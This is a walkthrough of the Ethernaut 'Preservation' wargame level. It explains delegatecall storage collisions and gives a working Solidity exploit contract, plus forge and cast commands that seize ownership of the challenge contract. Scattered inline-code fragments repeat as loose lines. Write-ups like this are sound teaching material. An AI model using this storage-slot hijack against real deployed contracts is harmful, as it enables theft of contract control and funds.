@@ -1,0 +1,120 @@
+"This level wants us to become the new owner to complete the instance. 
+This is similar to other levels where we solved challenges related to delegate calls and how they can be used to preserve the state and storage. It is recommended to go through levels 6 and 12 before starting with this one. Let's dive in.
+We learned in levels 6 and 12 about how delegate calls can be used to make external calls to other contracts. This is mostly used in library calls and the storage changes are replicated. 
+A delegate call is a special low-level call in Solidity to make external calls to another contract. Solidity By Example does an excellent job of explaining this. 
+Let's assume there are two contracts, similar to the one shown in Ethernaut's Delegation level, contracts A and B.
+When contract A executes delegatecall to contract B, B's code is executed with contract A's storage, msg.sender and msg.value.
+A
+B
+A
+delegatecall
+B
+B
+A
+msg.sender
+msg.value
+This means that it is possible to modify a contract's storage using a code (malicious code) belonging to another contract.
+Let's go through the vulnerable code:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Preservation {
+
+    // public library contracts 
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner; 
+    uint storedTime;
+    // Sets the function signature for delegatecall
+    bytes4 constant setTimeSignature = bytes4(keccak256(""setTime(uint256)""));
+
+    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
+        timeZone1Library = _timeZone1LibraryAddress; 
+        timeZone2Library = _timeZone2LibraryAddress; 
+        owner = msg.sender;
+    }
+
+    // set the time for timezone 1
+    function setFirstTime(uint _timeStamp) public {
+        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+
+    // set the time for timezone 2
+    function setSecondTime(uint _timeStamp) public {
+        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+    }
+}
+
+// Simple library contract to set the time
+contract LibraryContract {
+
+    // stores a timestamp 
+    uint storedTime;    
+
+    function setTime(uint _time) public {
+        storedTime = _time;
+    }
+}
+
+setTimeSignature
+setFirstTime
+setSecondTime
+uint _timeStamp
+storedTime
+address public timeZone1Library
+setTime()
+To complete the level, here's what we have to do:
+setFirstTime()
+_timeStamp
+setTime()
+_time
+storedTime
+timeZone1Library
+setTime()
+owner
+owner
+setFirstTime
+Let's now look at our exploit code:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""../instances/Ilevel16.sol"";
+
+contract DelegateHack {
+
+    address public t1;
+    address public t2;
+    address public owner;
+    Preservation level16 = Preservation(0x1E422B805DC5541a09fBbf239D734313B9F42Eca);      
+
+    function exploit() external {
+        level16.setFirstTime(uint256(address(this)));
+        level16.setFirstTime(uint256(0xEAce4b71CA1A128e8B562561f46896D55B9B0246));
+    }
+
+    function setTime(address _owner) public {
+        owner = _owner;
+    }
+
+}
+
+As mentioned above, we are calling setFirstTime() first with the address of our DelegateHack contract and then again with the address value we want to set as the owner in the Preservation contract. 
+setFirstTime()
+We are also defining a function with the same name as in the LibraryContract - setTime() because the function signature is constant in setTimeSignature. But our function is taking an address and assigning it to the owner variable in slot 2 which is mapped to the owner variable in the Preservation contract since our slot arrangement is the same. This will set the owner. 
+setTime()
+setTimeSignature
+owner
+Let's deploy the contract using:
+forge create DelegateHack --private-key $PKEY --rpc-url $RPC_URL
+
+Now we can call our exploit() function to trigger the exploit and become the new owner:
+exploit()
+cast send 0x1e36cAD4732E1EFD5Dd5dAf44C3E4c6f622D93fC ""exploit()"" --private-key $PKEY --rpc-url $RPC_URL
+
+
+The instance can now be submitted to finish the level. 
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+My article on setting up your workspace to get started with Ethernaut using Foundry and Solidity - blog.dixitaditya.com/getting-started-with-e..
+library
+contract
+delegatecall"
